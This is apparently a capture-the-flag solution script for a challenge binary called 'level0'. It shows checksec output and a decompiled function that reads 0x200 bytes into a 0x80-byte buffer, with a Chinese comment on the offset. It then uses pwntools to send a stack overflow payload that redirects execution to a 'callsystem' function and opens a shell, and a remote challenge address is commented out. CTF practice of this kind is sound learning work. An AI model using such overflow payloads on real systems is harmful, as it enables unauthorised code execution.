"""
>>> checksec level0
[*] 'level0'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE

ssize_t vulnerable_function()
{
  char buf; // [rsp+0h] [rbp-80h]

  return read(0, &buf, 0x200uLL);
}

buf距离EBP为0x80，这个是64位的程序，一个EBP占8bytes
"""

from pwn import *

# r = remote("111.198.29.45", 31711)
r = process("level0")

print(r.recvuntil("Hello, World"))
payload = b'0' * (0x80 + 0x8) + p64(ELF("level0").sym[b'callsystem'])
r.sendline(payload)
r.interactive()
